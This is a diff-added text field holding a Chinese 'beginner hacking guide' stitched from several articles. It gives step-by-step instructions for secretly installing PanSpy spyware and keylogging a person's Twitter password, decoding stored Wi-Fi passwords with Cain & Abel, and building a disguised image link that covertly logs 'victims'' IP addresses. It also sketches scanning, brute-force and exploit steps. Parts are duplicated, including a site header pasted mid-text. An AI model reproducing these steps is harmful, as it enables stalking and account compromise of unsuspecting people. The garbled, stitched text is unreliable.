+    \ Muthiyah 以漏洞赏金形式获得的 30,000 美元多得多的费用。提醒所有互联网用户使用强大、唯一的密码更好地保护他们的在线账户，并在可能的情况下启用双因素认证。\n\
+    \n## 黑客攻击 Twitter 账户的最佳方式\n\n经过十几次不成功的黑客尝试，你在反复尝试黑客攻击 Twitter 账户时感到紧张和恼火。这就是特殊的黑客软件和键盘记录器可以帮助你完成秘密任务的地方。PanSpy\
+    \ 是一款功能强大的手机追踪应用程序，可让你秘密访问某人的 Twitter 账户。与任何其他间谍应用相比，此应用可用于多种目的，因为它具有许多功能。你可以使用此应用程序在任何运行\
+    \ Android 5.0 或更高版本的 Android 设备（包括三星、华为、HTC、Oppo、索尼、LG）上黑客攻击消息、位置、联系人、通话记录、键盘记录器、应用、电子邮件等。\n\
+    \n### 为什么选择此工具黑客攻击 Twitter 账户：\n\n*   **追踪手机活动：** 通话记录、消息、电子邮件、文档、日历、照片、视频、应用等\n\
+    *   **追踪当前位置：** GPS、地理围栏、WiFi 记录器\n*   **监控社交应用：** WhatsApp、Skype、Facebook、Instagram、Snapchat、Line、Kik、Tinder、Hangouts\
+    \ 等\n*   **远程控制：** 应用拦截器、时间限制\n\n### 黑客攻击 Twitter 账户的三个步骤\n\n#### 步骤 1：订阅 PanSpy。\n\
+    \n首先访问 PanSpy 官方网站创建账户，点击注册按钮。使用真实的电子邮件地址注册 PanSpy。成功创建 PanSpy 账户后，它会发送确认链接到你的邮箱以激活账户，只需导航到你的邮箱地址，点击链接激活账户，然后按照设置向导完成以下设置过程。\n\
+    \n#### 步骤 2：选择订阅并安装应用程序。\n\n从两个版本中选择订阅：高级版、旗舰版。两个版本均支持 1 个月订阅、季度订阅和 1 年订阅。成功订阅服务后，你将获得下载链接，只需下载并设置\
+    \ PanSpy 应用。然后登录你的 PanSpy 账户，并按照说明设置并授予应用访问受监控手机数据的权限。完成所有流程并启动服务后，你可以选择删除应用图标或将其保留在主屏幕上。\n\
+    \n#### 步骤 3：开始黑客攻击 Twitter 账户。\n\n现在，返回电脑控制面板，你将拥有对手机的完全无限制访问权限，并可以轻松黑客攻击 twitter\
+    \ 账户。要获取 Twitter 密码，只需使用 PanSpy 的键盘记录器功能。然而，这还不是全部，你也可以用它来黑客攻击 Viber、Snapchat、WhatsApp、Line、WhatsApp\
+    \ 等。\n\n## 访问无线网络\n\n正如你所知，无线网络是一种不使用任何电线连接的网络。这些网络使用无线电波将计算机和其他设备连接在一起。要访问这些网络，你需要：\n\
+    \n*   一台启用了无线网络的设备（笔记本电脑、智能手机等）\n*   设备和你都需要在无线网络接入点（WiFi 路由器）的传输半径范围内\n\n如果网络没有密码保护，除了点击它之外，你不需要做任何进一步的事情就能获得访问权限。它简直是在乞求被黑客攻击。但如果网络像大多数那样受密码保护，那么你需要它的密码才能获得访问权限。\n\
+    \n### 无线网络认证 WEP 和 WPA\n\n各种无线网络设备使用许多认证技术。这些包括：`WEP`、`WPA`、`WPA2`、`WPA3`、`WPA2\
+    \ + AES`、`WPA + AES`、`WPA + TKIP/AES`、`WPA + TKIP` 等。`WEP` 和 `WPA` 是无线网络中最常用的两种认证技术。在学习如何黑客攻击无线网络之前，了解这两种技术有助于建立坚实的基础。它还将帮助你收集关于接入点所需的信息。\n\
+    \n#### WEP\n\n`WEP`（有线等效保密）是 IEEE 802 的一种安全算法。它的开发初衷是克服传统有线连接的数据机密性问题。它通过加密传输的数据来防止窃听，提供了更好的数据保护。`WEP`\
+    \ 认证使用两种方法：\n\n*   **开放系统认证 (OSA)** – OSA 可帮助你访问任何 `WEP` 网络以及接收未加密的文件\n*   **共享密钥认证\
+    \ (SKA)** – SKA 允许配备无线调制解调器的计算机完全访问任何 `WEP` 网络，并交换加密和未加密的数据。\n\n#### WPA\n\n在\
+    \ `WEP` 中发现的弱点导致了 Wi-Fi Protected Access 的开发。`WPA` 成为具有无线互联网连接的计算设备的安全标准。`WPA`\
+    \ 对 802.11 WLAN 上的数据进行加密。除此之外，`WPA` 使用 48 位初始值，而不是 `WEP` 使用的 24 位，这使其具有更高的初始值。然而，据报道\
+    \ `WPA` 多次受到 `DDoS` 攻击的影响。\n\n### 一般攻击类型\n\n*   **中间人攻击：** 指拦截两个人之间的通信以窃取数据。\n\
+    *   **拒绝服务 (`DDoS`)：** 要做到这一点，你必须用流量淹没网络。结果，它无法满足任何请求，导致系统不可用\n*   **嗅探：** 涉及拦截通过网络传输的数据包。\n\
+    \n除了上述攻击外，还有各种类型的攻击可能危害计算机网络安全，这在两种类型的黑客攻击中都很有用。理解这些攻击不仅有助于你了解如何黑客攻击网络，还能学习网络安全。此外，它还将帮助你成为一名道德黑客。\n\
+    \n### 用于黑客攻击无线网络的工具\n\n为了能够正确使用和理解这些工具，我们建议你建立坚实的道德黑客基础并学习一些编程语言。以下是一些用于破坏计算机网络安全的最流行工具列表：\n\
+    \n*   `Aircrack`\n*   `AirSnort`\n*   `Kismet`\n*   `Cain & Abel`\n*   `WireShark`\n\
+    *   `Fern WiFi Wireless Cracker`\n*   `CoWPatty`\n*   `Wifiphisher`\n*   `KisMac`\n\
+    *   `Reaver`\n\n### 如何黑客攻击无线网络\n\n最后，让我们进入解码存储的无线网络密码的分步教程。\n\n1.  首先，从提供的链接下载\
+    \ `Cain & Abel`\n2.  其次，确保你在想要黑客攻击的网络范围内并尝试连接。\n3.  打开 `Cain & Abel`\n4.  选择“Decoders（解码器）”选项卡\n\
+    5.  从导航菜单选择“Wireless Passwords（无线密码）”\n6.  点击加号 (`+`) 按钮\n7.  解码器将显示曾用于访问网络的加密类型、`SSID`\
+    \ 和密码。\n\n### 保护无线网络\n\n现在你知道了如何黑客攻击 WiFi 网络，是时候了解一些可以采取的步骤来防止别人黑客攻击你的 WiFi。毕竟，如果不懂得如何黑客攻击和如何防范黑客攻击，你就无法成为一名道德黑客。\n\
+    \n*   更改硬件附带的默认密码\n*   启用认证机制\n*   仅允许注册的 `MAC` 地址可以限制对网络的访问。\n*   使用强 `WEP` 和\
+    \ `WPA-PSK` 密钥以及包含符号、数字和字符组合的密码，可以降低密钥被字典和暴力破解攻击破解的几率\n*   防火墙软件有助于减少未经授权的访问。\n\
+    \n## 如何黑客攻击 IP 地址（经过验证的方法及步骤）\n\n如何用经过验证的方法黑客攻击 `IP` 地址（创建记录网站）也许有人声称知道你的 `IP`\
+    \ 地址而吓唬你。另一方面，你可能是想通过获取朋友的 `IP` 地址来吓唬他。或者，也许你只是想听听关于黑客攻击 `IP` 地址的真相。不用再找了，因为在本指南中我们将给你所有真相。我们将按照以下议程解释如何黑客攻击\
+    \ `IP` 地址：\n\n*   简要介绍什么是 `IP` 地址\n*   如何黑客攻击 `IP` 地址\n*   黑客如何找出 `IP` 地址\n* \
+    \  当黑客知道你的 `IP` 地址时能做什么\n\n读完本指南后，你将能够悄无声息地找出潜在任何人的 `IP` 地址。\n\n### 这合法吗？\n\n\
+    在大多数情况下，是合法的。知道某人的 `IP` 地址是互联网上“正常”通信的一部分，所以这样做没有问题。然而，如果你使用 `IP` 地址侵犯他人的电脑，你在许多司法管辖区都在犯罪。我们不支持此类活动。你读到的一切都应该在你个人拥有和控制的系统上尝试。我们不对你的行为负责。此外，请记住这不是法律建议。我们是\
+    \ IT 人员，不是律师。如果你在寻找法律建议，最好咨询你的律师。\n\n### 黑客攻击 IP 地址之前\n\n在开始黑客攻击之前，我们应该花几句话谈谈\
+    \ `IP` 地址。在 IT 领域，特别是黑客攻击中，永远不要在不知道自己在做什么的情况下做任何事。确实，这个概念在这里很重要。很多人谈论“黑客攻击 IP\
+    \ 地址”甚至不知道什么是 `IP` 地址。这可能导致被黑客攻击者产生不合理的恐惧，或黑客者产生夸大的荣耀。“黑客攻击 IP 地址”到底意味着什么？你能用它做什么？现在，我们将揭开\
+    \ IP 地址黑客攻击的神秘面纱。\n\n### 什么是 IP 地址？\n\n`IP` 地址只不过是一个数字标识符。它标识网络（如互联网）中的 PC、智能手机或任何其他设备。你可以把它想象成普通邮件地址。如果我知道你的普通邮件地址，我就知道你在哪里，可以给你寄信。有了\
+    \ `IP` 地址，我可以（大致）知道你的设备在哪里，并给你发送一些互联网流量。换句话说，你在互联网上由你的 `IP` 地址标识。通常，你的互联网提供商为你家里的路由器分配一个公共\
+    \ `IP` 地址。当你家庭网络中的设备想要通过互联网发送流量时，它们将使用那个公共 `IP` 地址（在所有设备间共享）。互联网上的通信通过数据包进行。每一块数据被放入一个包中，你可以把它想象成一封信。在信封上，你总是写上源和目的\
+    \ `IP` 地址。互联网会负责将数据包送达正确的目的地。现在，正如你所见，如果你发送流量出去，你会写上你的 `IP` 作为源 `IP`。这是对方知道它并发送一些流量回来的唯一途径。\n\
+    \n### 我们真的需要使用真实的 IP 地址作为源吗？\n\n当然！想象一下你想下载一部电影、查看一个网页，或你在互联网上做的任何其他事情。你联系一个第三方服务器，它发送你请求的内容。它需要知道发送到哪里，所以它需要知道你的\
+    \ `IP`。\n\n### 我有危险吗？\n\n这取决于情况，但在大多数情况下，你没有危险。从上面的段落可以看出，知道别人的 `IP` 是合法的。你需要它来发送回流量。如果你的\
+    \ `IP` 地址落入坏人之手会怎样？仅仅知道你的 `IP` 地址，没有人能伤害你。然而，他们可以开始扫描你的电脑，看看你是否有可利用的漏洞来访问你的数据。我们稍后会谈到这一点。\n\
+    \n### 如何找出某人的 IP 地址？\n\n在下一节中，我们将介绍一种开箱即用的技术。然而，它依赖于一个简单的原则：你的受害者需要给你发送一些流量。如果他这样做了，砰，你就有了他的\
+    \ `IP` 地址。你的电脑已经学会了这样的 `IP` 地址，但它不显示给你。我们将看看如何查看它。\n\n### 黑客攻击 IP 地址的经过验证的方法\n\
+    \n#### 一些误解和旧技术\n\n互联网上充斥着关于黑客攻击 `IP` 地址的低质量内容。你可能会读到关于用 Skype 黑客攻击 `IP` 地址的内容并为此兴奋，但自\
+    \ 2017 年以来这已不再可能。因此，在本文中，我们将使用黑客攻击 `IP` 地址的最佳方法。我们将使用唯一一种仅取决于你、不依赖第三方服务的方法。因此，它将始终有效。此外，它易于应用和使用。\n\
+    \n#### 我们技术背后的原理\n\n我们技术背后的想法很简单。你基本上给受害者一个链接：他们可以用手机、电脑或任何设备打开它。在该链接上，他们将看到你选择的图片（我们建议使用有趣的图片）。然而，你的系统也会自动追踪他们的\
+    \ `IP` 地址和更多信息，如他们使用的浏览器和操作系统。当这发生时，他们将看到有趣的图片并为此大笑。他们无法知道你正在追踪他们的 `IP` 地址。\n\n\
+    #### 步骤 #1 – 注册一个网站（免费！）\n\n你想给受害者一个有效的可点击链接，并且它必须在线有效。因此，我们需要注册一个网站。网上有很多免费服务可以注册网站，其中我们选择了\
+    \ x10 hosting。去他们的网站注册一个新账户。首先，他们会要求你选择一个域名镜像。为你想要分享的图片类型选择一个可信的。继续注册并验证你的邮箱。一旦完成该过程，你将进入主页，在那里你必须创建一个网站。现在你会说“等等，我以为我们已经创建了那个！”……差不多。直到现在，我们创建了名称。现在，我们必须准备其背后运行的软件。\n\
+    \n#### 步骤 #2 – 创建网站本身\n\n主页将如下所示。从那里，只需点击右上角的绿色 Add Website（添加网站）按钮。一个快速向导将打开。从那里，我们必须调整一些项目。首先，选择“Custom\
+    \ Website（自定义网站）”。然后，作为网站名称，写一些能让人联想到该网站的东西，比如它的域名。作为最后一项，留空地址路径。然后，点击 Add Website。创建网站，然后在下一页选择“Continue\
+    \ to my website（继续到我的网站）”。恭喜，我们快完成了！\n\n#### 步骤 #3 – 下载 IPFinder 脚本\n\n现在你的网站准备好了。我们所要做的就是上传脚本，负责保存\
+    \ `IP` 地址并向用户提供图片。幸运的是，你不需要自己编写脚本：我们已经为你做好了。它使用一个 `PHP` 文件、三个 `HTAccess` 文件和两个文件夹。我们的\
+    \ `IPFinder` 脚本以有用的 zip 包形式提供，你可以通过下面的链接免费下载。只需点击它并下载 zip 文件。现在你有了它，甚至不要解压。我们将直接在网站上解压：继续下一步。\n\
+    \n#### 步骤 #4 – 上传 IPFinder 脚本\n\n从网站页面，选择 File Manager（文件管理器）选项。这将打开一个类似于 Windows\
+    \ 资源管理器的新窗口。网站只是公共服务器上的一组文件。通过这个文件管理器，你可以查看这些文件。我们需要向它们添加我们的脚本。一旦进入文件管理器，选择 Upload（上传）(1)。这将打开一个新窗口，你可以在其中点击“Browse（浏览）”并搜索你下载的文件。选择那个压缩文件（`ipfinder.zip`）并等待上传完成。然后，关闭此窗口并在之前的窗口中点击\
+    \ Reload（重新加载）(2)。现在你应该在列表中看到一个新文件，就在“cgi-bin”下面。这是我们包含 `IPFinder` 的压缩包，我们只需要解压它。\n\
+    \n#### 步骤 #5 – 解压 IPFinder\n\n选择 `ipfinder.zip` 使其背景变蓝。然后，从顶部菜单选择 Extract（解压）。一个新窗口将弹出。只需点击\
+    \ Extract File(s)（解压文件）而不更改任何内容。然后，等待过程完成，一完成就点击 Close（关闭）按钮。你的列表上将有一些更多的文件和文件夹。如果没有，就像之前那样点击\
+    \ Reload 按钮。此时，我建议你删除 `ipfinder.zip` 文件。你不再需要它了，因为我们已经解压了它的内容。所以，只需点击它然后点击顶部的删除按钮。此步骤不是强制性的，但这是一个好习惯。\n\
+    \n#### 步骤 #6 – 添加图片\n\n我们的 `IPFinder` 不带图片。然而，它是一个显示图片并记录查看者 `IP` 的脚本。因此，你需要添加自己的图片。所以，找一个你认为适合此目的的\
+    \ `jpeg` 图片。目前，我们的脚本仅支持 `JPEG/JPG` 图片。一旦你有了那张图片，用一个不带空格的简单名称重命名它。然后，双击 images\
+    \ 文件夹查看其内容。\n\n### 简要介绍什么是 IP 地址\n\n`ICTShore.com` 菜单 如何黑客攻击 `IP` 地址（经过验证的方法及步骤）\
+    \ Alessandro Maggio 2018 年 2 月 22 日 如何用经过验证的方法黑客攻击 `IP` 地址（创建记录网站） 分享此帖子 分享到 linkedin\
+    \ 分享到 facebook 分享到 twitter 分享到 email 也许有人声称知道你的 `IP` 地址而吓唬你。另一方面，你可能是想通过获取朋友的\
+    \ `IP` 地址来吓唬他。或者，也许你只是想听听关于黑客攻击 `IP` 地址的真相。不用再找了，因为在本指南中我们将给你所有真相。我们将按照以下议程解释如何黑客攻击\
+    \ `IP` 地址： 简要介绍什么是 `IP` 地址 如何黑客攻击 `IP` 地址 黑客如何找出 `IP` 地址 当黑客知道你的 `IP` 地址时能做什么\
+    \ 读完本指南后，你将能够悄无声息地找出潜在任何人的 `IP` 地址。\n\n### 这合法吗？\n\n在大多数情况下，是合法的。知道某人的 `IP` 地址是互联网上“正常”通信的一部分，所以这样做没有问题。然而，如果你使用\
+    \ `IP` 地址侵犯他人的电脑，你在许多司法管辖区都在犯罪。我们不支持此类活动。你读到的一切都应该在你个人拥有和控制的系统上尝试。我们不对你的行为负责。此外，请记住这不是法律建议。我们是\
+    \ IT 人员，不是律师。如果你在寻找法律建议，最好咨询你的律师。\n\n### 黑客攻击 IP 地址之前\n\n在开始黑客攻击之前，我们应该花几句话谈谈\
+    \ `IP` 地址。在 IT 领域，特别是黑客攻击中，永远不要在不知道自己在做什么的情况下做任何事。确实，这个概念在这里很重要。很多人谈论“黑客攻击 IP\
+    \ 地址”甚至不知道什么是 `IP` 地址。这可能导致被黑客攻击者产生不合理的恐惧，或黑客者产生夸大的荣耀。“黑客攻击 IP 地址”到底意味着什么？你能用它做什么？现在，我们将揭开\
+    \ IP 地址黑客攻击的神秘面纱。\n\n### 步骤 7# – 使用 IPFinder\n\n现在你的 `IPFinder` 已准备就绪。我们如何使用它？非常简单，因为它会自动创建我们需要的\
+    \ URL。你与受害者分享的 URL 将类似于这个。在这个 URL 中，每个部分都是可定制的。域名是你网站的名称，即你创建账户时选择的名称。你无法更改它。在我们的例子中，这是“coolimages”。图片名称是你上传的图片名称，所以在我们的例子中，这是“meme.jpg”\
+    \ 用户 ID 是你应该仔细选择的东西。在这里你可以写任何你想要的字母和数字组合。现在我们将看到如何使用它\n\n#### 选择用户 ID\n\n`IPFinder`\
+    \ 将为每个查看 log 文件夹中图片的受害者保存一个新的文本文件。该文件包含日期、时间和你指定的用户 ID。此字段的目的是让你区分用户。想一想，如果你想把链接给多个人怎么办？你怎么知道哪个\
+    \ `IP` 对应哪个人？你无法知道。使用这种方法，你会发送链接 `/meme.jpg/john` 给 John，发送链接 `/meme.jpg/alice`\
+    \ 给 Alice。他们将看到同一张图片，但你会分别记录他们的 `IP`。\n\n### 黑客攻击 IP 地址，获取结果\n\n浏览 log 文件夹。你将看到一些具有上述名称的文本文件。打开任意一个并阅读其内容（选择它并点击编辑）。在每个文件中，你将看到类似这样的内容。\n\
+    \n### 你可以用黑客攻击的 IP 地址做什么？\n\n此时，你的 `IP` 查找器已就位。你分享了一些图片，从而获得了一些 `IP`。你可以真正黑客攻击\
+    \ `IP` 地址，但你仍在想知道有人能用 `IP` 地址做什么。另一方面，你可能是那个认为自己被黑客攻击的人，想知道你是否真的处于危险中。不用再找了，这里我们将告诉你关于黑客攻击\
+    \ `IP` 地址后会发生什么的终极真相。\n\n#### 黑客攻击 IP 地址以恐吓人们\n\n许多自称黑客的人黑客攻击 `IP` 地址只是为了恐吓人们。他们联系对方并告诉他们知道他们的\
+    \ `IP` 地址，也许还有他们的浏览器。普通电脑用户会相信他们访问了他们的电脑，否则他们怎么知道他们用哪个浏览器？所以，人们感到害怕并开始相信黑客。我听说过“黑客”用这种方法勒索钱财的故事。他们基本上让受害者相信他们访问了他们的数据，并威胁分享一些私人照片之类的。事实是，他们甚至不知道那些照片是否真实存在。然而，他们用同样的措辞接近每个人。结果，他们会吓坏任何持有此类照片的人。当然，这种活动是非法的。\n\
+    \n#### 地理定位你\n\n如果你获得某人的 `IP` 地址，你可以非常粗略地对其进行地理定位。在城市地区，位置将精确到几平方公里；在农村地区，精确到几十平方公里。这是一个经验法则，可能会有所不同，但你永远不会足够精确。只有你的服务提供商，从而警察，才能用你的家庭地址精确定位你。对于其他人，你只能靠知道城市或县来凑合。\n\
+    \n#### 真正访问设备或个人数据\n\n如果有人知道你的 `IP` 地址，他可以扫描你。这意味着他可以尝试检测你正在运行的系统和你的漏洞。现在，由于你的公共\
+    \ `IP` 地址在你的家庭路由器上，他们将对你的路由器执行此操作。他们将获得对你路由器的访问权限，并从那里采用相同的方法访问你的电脑。这个过程漫长而复杂，需要熟练的黑客。然而，它总是遵循相同的指导原则。\n\
+    \n1.  寻找暴露的服务（用 `nmap`）并尝试用 `TCP` 签名检测硬件和软件版本\n2.  在暴露的服务上寻找常见漏洞，或针对该特定硬件/软件的漏洞\n\
+    3.  尝试用暴力破解获得访问权限\n4.  尝试创建自定义漏洞利用\n\n当然，第四步非常难，许多黑客会直接放弃。那一步是为有技能和预算、想专门黑客攻击你的人准备的。\n\
+    \n### 我如何保护自己？\n\n在许多连接中，重启路由器会更改你的公共 `IP` 地址。就是这样。如果黑客正在攻击你，他们将不得不再次找到你的 `IP`。此外，你可以通过使用\
+    \ `VPN` 或像 `TOR` 这样的代理链来提高安全级别。在这种情况下，你基本上联系互联网上某个你信任（可能拥有）的服务器。然后，那台服务器代表你在网络上发起请求。如果有人追踪你的\
+    \ `IP` 地址，他们将追踪那台服务器的 `IP` 地址。\n\n## 如何黑客攻击智能手机\n\nTrust Digital 的 Meir Machlin\
+    \ 演示了如何使用 `SMS` 黑客攻击智能手机。Machlin 向我们演示了两种使用任何人都能获得的基本工具的黑客攻击。Machlin 的“黑客工具包”包括一台带有\
+    \ `WiFi` 连接的笔记本电脑，和两部手机。一部手机作为笔记本电脑的 `GSM` 调制解调器，另一部是 Machlin 的个人手机，用于接收信息。第三部手机作为我们的目标设备，即演示中“受攻击”的手机。我们观看的第一种攻击被称为“午夜袭击”，因为它通常在夜间实施，当时手机用户正在睡觉，设备在充电时仍处于开机状态，或只是放在床头柜上。Machlin\
+    \ 发送了一条简单的 `SMS`，在受攻击设备上调用了 Internet Explorer。首先，Machlin 发送了一张图片到目标手机，上面写着“You\
+    \ have been hacked”（你已被黑客攻击），以展示用 `SMS` 进入另一个用户手机有多快和容易。在第二次推送中，Machlin 在受攻击手机上运行了一个可以检索数据的应用程序。`SMS`\
+    \ 连同受攻击手机的 `INSI` 号码（手机的唯一 ID）回传到了 Machlin 的手机。然而，Machlin 指出该应用程序同样可以轻松窃取联系人列表，无论是个人还是公司的。他说在这种情况下也有可能向设备推送病毒，甚至发起拒绝服务攻击。\n\
+    \n## 如何黑客攻击智能手机，第 2 部分\n\nTrust Digital 的 Meir Machlin 继续演示如何黑客攻击智能手机。在第二个演示中（你可以在“如何黑客攻击智能手机，第\
+    \ 2 部分”中查看），Machlin 演示了一个控制消息攻击。在这种黑客攻击中，罪犯可以在用户毫不知情的情况下更改设备的控制设置。他向我们展示了他如何轻松取消勾选\
+    \ `SSL`，使设备在没有加密的情况下变得脆弱。作为压轴，他推送了一个擦除命令，删除了设备上所有存储的信息。Machlin 说，该擦除命令也可以推送到被黑客攻击手机联系人列表中包含的所有设备。根据\
+    \ Machlin 的说法，这些攻击证明短信不再安全。他说，这类黑客攻击是智能手机独有的，因为 PC 没有 `SMS` 功能。哪些智能手机容易受到这类攻击？这很大程度上取决于设备使用的安全设置和实践。一些人认为移动设备对组织几乎不构成安全威胁。事实上，在\
+    \ 3 月举行的一场最近的黑客“竞赛”中，没有一款预定被攻击的智能手机被攻破。然而，Gartner 分析师 John Girard 的一份报告预测，随着无线设备在企业中变得更加普及，安全问题的可能性将增加。Machlin\
+    \ 建议所有在组织控制下的智能手机都应受到严密监控、定期打补丁和更新，以避免用户自行其是。\n\n## 结论\n\n对于新手来说，很难找到从哪里可以获得实践经验。本文涵盖了所有基础和最常用的被黑客攻击设备以及执行攻击的方法或策略。这是一份免费学习初学者黑客技术的完整指南。本文为初学者阐明了以下术语，以便开始黑客之旅。\n\
+    \n"
+  toc: []
